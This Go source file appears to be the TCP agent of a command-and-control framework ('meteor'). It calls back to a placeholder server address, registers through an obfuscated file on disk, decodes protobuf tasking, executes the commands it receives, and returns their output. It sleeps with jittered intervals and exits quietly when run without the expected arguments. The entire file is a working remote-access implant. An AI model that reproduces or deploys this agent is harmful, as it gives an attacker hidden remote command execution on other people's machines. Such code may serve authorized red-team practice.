package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	agentUtils "github.com/degenerat3/meteor/agents/utils"
	"github.com/degenerat3/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"
)

// SERVER is the IP/port of the TCP server to connect to (ex: `192.168.1.2:1234`)
var SERVER = "$$SERVER$$"

// INTERVAL is how long to sleep between callbacks
var INTERVAL = 1234123499

// DELTA is the jitter/variation in interval per cycle
var DELTA = 4321432199

// REGFILE is the path to the disk location where the registration file will be kept (ex: `/etc/ botconf.txt`)
var REGFILE = "$$REGFILE$$"

// OBFTEXT is the obfuscation text that will be used when generating the regfile
var OBFTEXT = "$$OBFTEXT$$"

// DEBUG specifies if execution of the client will write output
var DEBUG = false

func main() {
	if len(os.Args) != 2 && len(os.Args) != 3 {
		if DEBUG {
			fmt.Println("Executed without arguments, exiting...")
		}
		os.Exit(0)
	}
	for {
		var payload string
		regstat := agentUtils.CheckRegStatus(REGFILE)
		if DEBUG {
			fmt.Printf("RegStat: %t\n", regstat)
		}
		if regstat {
			payload = agentUtils.GenCheckin(REGFILE, OBFTEXT)
		} else {
			payload = agentUtils.GenRegister(INTERVAL, DELTA, REGFILE, OBFTEXT)
		}
		if DEBUG {
			fmt.Printf("Payload: %s\n", payload)
		}
		conn, err := net.Dial("tcp", SERVER)
		if err != nil {
			if DEBUG {
				fmt.Printf("Error connecting to server: %s\n", err.Error())
			}
			endCheck()
			continue
		}
		if DEBUG {
			fmt.Printf("Writing payload to conn...\n")
		}
		fmt.Fprintf(conn, "%s\n", payload)
		if DEBUG {
			fmt.Printf("Reading data from conn...\n")
		}
		data, _ := bufio.NewReader(conn).ReadString('\n')
		conn.Close()
		data = strings.TrimSuffix(data, "\n")
		if DEBUG {
			fmt.Printf("Got response: %s\n", data)
		}
		decoded, err := base64.StdEncoding.DecodeString(data)
		if DEBUG {
			if err != nil {
				fmt.Println("Error decoding response: " + err.Error())
				endCheck()
			}
			fmt.Printf("Decoded: %s\n", decoded)
		}
		resp := &mcs.MCS{}
		err = proto.Unmarshal(decoded, resp)
		if err != nil {
			if DEBUG {
				fmt.Printf("Error unmarshalling data: %s\n", err.Error())
			}
			endCheck()
			continue
		}
		stat := resp.GetStatus()
		if DEBUG {
			fmt.Printf("Recd status: %d\n", stat)
		}
		if stat == 204 { // no actions rec'd
			endCheck()
			continue
		}
		actions := resp.GetActions()
		for _, acn := range actions {
			uid := acn.GetUuid()
			if DEBUG {
				fmt.Printf("Handling action: %s\n", uid)
			}
			mod := acn.GetMode()
			args := acn.GetArgs()
			acnOut := agentUtils.ExecCommand(mod, args)
			acnData := agentUtils.GenAddResult(uid, acnOut)
			conn, err = net.Dial("tcp", SERVER)
			if DEBUG {
				fmt.Printf("Writing response data...\n")
			}
			fmt.Fprintf(conn, "%s\n", acnData)
			if DEBUG {
				fmt.Printf("Reading response ack...\n")
			}
			data, _ = bufio.NewReader(conn).ReadString('\n')
			data = strings.TrimSuffix(data, "\n") // read the ack, even though we don't do anything with it rn
			conn.Close()
		}
		endCheck()
		conn.Close()

	}
}

func endCheck() {
	if DEBUG {
		fmt.Printf("Checking if program should exit...\n")
	}
	if len(os.Args) == 3 {
		os.Exit(0)
	}
	min := INTERVAL - DELTA
	max := INTERVAL + DELTA
	sleeptime := rand.Intn(max-min) + min
	if DEBUG {
		fmt.Printf("Sleeping for %d seconds...\n", sleeptime)
	}
	time.Sleep(time.Duration(sleeptime) * time.Second)
}
